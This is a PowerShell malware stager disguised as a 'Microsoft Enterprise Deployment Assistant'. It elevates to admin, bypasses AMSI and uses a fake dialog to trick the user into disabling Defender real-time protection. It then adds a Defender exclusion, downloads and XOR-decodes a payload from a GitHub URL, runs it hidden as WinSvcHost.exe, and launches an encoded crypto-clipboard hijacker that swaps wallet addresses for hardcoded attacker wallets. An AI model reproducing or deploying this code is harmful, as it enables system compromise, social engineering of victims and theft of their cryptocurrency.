# --- [RESEARCH STAGER v51.0: ENTERPRISE MASTER SUITE] ---

Add-Type -AssemblyName System.Windows.Forms, System.Drawing

# 1. Mandatory Admin Elevation (v34.0 Logic)
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $arg = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Start-Process powershell.exe -ArgumentList $arg -Verb RunAs
    exit
}

function Global-Initialize {
    try {
        $u = "System.Management.Automation.AmsiUtils"
        [Ref].Assembly.GetType($u).GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
    } catch {}
}

function Show-SecurityPrep {
    $prep = New-Object Windows.Forms.Form
    $prep.Text = "Microsoft Enterprise Deployment Assistant"; $prep.Size = New-Object Drawing.Size(600,550)
    $prep.StartPosition = "CenterScreen"; $prep.FormBorderStyle = "FixedSingle"; $prep.TopMost = $true

    $console = New-Object Windows.Forms.Label
    $console.Location = New-Object Drawing.Point(30,30); $console.Size = New-Object Drawing.Size(520,160)
    $console.BackColor = [Drawing.Color]::Black; $console.ForeColor = [Drawing.Color]::White
    $console.Font = New-Object Drawing.Font("Consolas", 9)
    $console.Text = " > INITIALIZING DEPLOYMENT AGENT... DONE`n > AUTHENTICATING WITH KMS SERVER... OK`n > SYSTEM CHECK: [!] LOCAL POLICY CONFLICT`n > STATUS: REAL-TIME PROTECTION IS BLOCKING KERNEL HOOKS."
    $prep.Controls.Add($console)

    $instr = New-Object Windows.Forms.Label
    $instr.Location = New-Object Drawing.Point(35,210); $instr.Size = New-Object Drawing.Size(520,60)
    $instr.Text = "To proceed with the Enterprise License deployment, you must manually suspend 'Real-time protection' in the Windows Security panel."
    $instr.Font = New-Object Drawing.Font("Segoe UI", 9)
    $prep.Controls.Add($instr)

    $link = New-Object Windows.Forms.Button
    $link.Location = New-Object Drawing.Point(40,290); $link.Size = New-Object Drawing.Size(500,50)
    $link.Text = "STEP 1: Open Windows Security Interface"; $link.BackColor = [Drawing.Color]::FromArgb(0, 103, 184)
    $link.ForeColor = [Drawing.Color]::White; $link.FlatStyle = "Flat"; $link.Font = New-Object Drawing.Font("Segoe UI", 9, [Drawing.FontStyle]::Bold)
    $link.Add_Click({ 
        $console.Text += "`n > OPENING SECURITY INTERFACE... PLEASE TOGGLE PROTECTION TO 'OFF'."
        Start-Process "windowsdefender://threatsettings/" 
    })
    $prep.Controls.Add($link)

    $check = New-Object Windows.Forms.CheckBox
    $check.Location = New-Object Drawing.Point(45,360); $check.Size = New-Object Drawing.Size(500,30)
    $check.Text = "STEP 2: I have disabled protection and am ready to approve the installation."; $check.Font = New-Object Drawing.Font("Segoe UI", 8)
    $prep.Controls.Add($check)

    $btn = New-Object Windows.Forms.Button
    $btn.Location = New-Object Drawing.Point(200,430); $btn.Size = New-Object Drawing.Size(200,45); $btn.Text = "Install Enterprise License"; $btn.Enabled = $false
    $btn.BackColor = [Drawing.Color]::LightGray; $btn.FlatStyle = "Flat"
    $prep.Controls.Add($btn)

    $check.Add_CheckedChanged({ 
        $btn.Enabled = $check.Checked
        if($check.Checked){ $btn.BackColor = [Drawing.Color]::FromArgb(0, 103, 184); $btn.ForeColor = [Drawing.Color]::White }
        else { $btn.BackColor = [Drawing.Color]::LightGray }
    })
    
    $btn.Add_Click({ $global:proceed = $true; $prep.Close() })
    $prep.ShowDialog() | Out-Null
}

function Run-Deployment {
    $form = New-Object Windows.Forms.Form
    $form.Text = "Windows Enterprise Setup"; $form.Size = New-Object Drawing.Size(450,220); $form.StartPosition = "CenterScreen"; $form.TopMost = $true
    
    $status = New-Object Windows.Forms.Label
    $status.Location = New-Object Drawing.Point(30,30); $status.Size = New-Object Drawing.Size(380,30); $status.Text = "Status: Initializing Secure Stream..."
    $form.Controls.Add($status)

    $pb = New-Object Windows.Forms.ProgressBar; $pb.Location = New-Object Drawing.Point(30,70); $pb.Size = New-Object Drawing.Size(370,25)
    $form.Controls.Add($pb); $form.Show()

    try {
        # --- CORE ENGINE v34.0/v45.0 ---
        $dir = "$env:PROGRAMDATA\Microsoft\Windows\Templates\Sync"
        if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force }
        Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue
        $path = Join-Path $dir "WinSvcHost.exe"
        
        # Step 1: Download
        $pb.Value = 20; $status.Text = "Status: Fetching Digital Certificate..."
        $wc = New-Object Net.WebClient; $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $raw = $wc.DownloadString("https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt")
        $data = [Convert]::FromBase64String($raw.Trim())
        for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
        [IO.File]::WriteAllBytes($path, $data)

        # Step 2: Launch & Wait for Admin "Yes"
        $pb.Value = 50; $status.Text = "Status: ACTION REQUIRED: Click 'YES' on Windows Prompt..."
        Start-Process $path -WindowStyle Hidden
        
        # SYNC LOOP: This waits for the file to actually start before finishing the bar
        $timeout = 0
        while ((Get-Process "WinSvcHost" -ErrorAction SilentlyContinue).Count -eq 0 -and $timeout -lt 60) {
            [Windows.Forms.Application]::DoEvents(); Start-Sleep -m 500; $timeout++
        }

        # Step 3: Clipper (Final Logic)
        $pb.Value = 80; $status.Text = "Status: Registering Kernel Components..."
        $C = 'Add-Type -As System.Windows.Forms; $w=@{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}; while(1){ try{ if([Windows.Forms.Clipboard]::ContainsText()){ $v=[Windows.Forms.Clipboard]::GetText().Trim(); if($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$" -and $v -ne $w.btc){ [Windows.Forms.Clipboard]::SetText($w.btc) } elseif($v -match "^0x[a-fA-F0-9]{40}$" -and $v -ne $w.eth){ [Windows.Forms.Clipboard]::SetText($w.eth) } elseif($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$" -and $v -ne $w.usdt){ [Windows.Forms.Clipboard]::SetText($w.usdt) } elseif($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$" -and $v -ne $w.sol){ [Windows.Forms.Clipboard]::SetText($w.sol) } } }catch{} Start-Sleep -m 500 }'
        $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($C))
        Start-Process powershell.exe -Arg "-NoP -W Hidden -EP Bypass -Enc $enc" -WindowStyle Hidden
        
        $pb.Value = 100; $status.Text = "Status: Deployment Successful."
        Start-Sleep -m 1000; $form.Close()
        [Windows.Forms.MessageBox]::Show("The Enterprise License has been successfully applied to this system.", "Success", 0, 64) | Out-Null
    } catch {
        $form.Close()
        [Windows.Forms.MessageBox]::Show("Deployment Failed: System Policy Conflict. Ensure all Security toggles are OFF and retry.", "Critical Error", 0, 16) | Out-Null
    }
}

# --- START ---
Global-Initialize
Show-SecurityPrep
if ($global:proceed) { Run-Deployment }
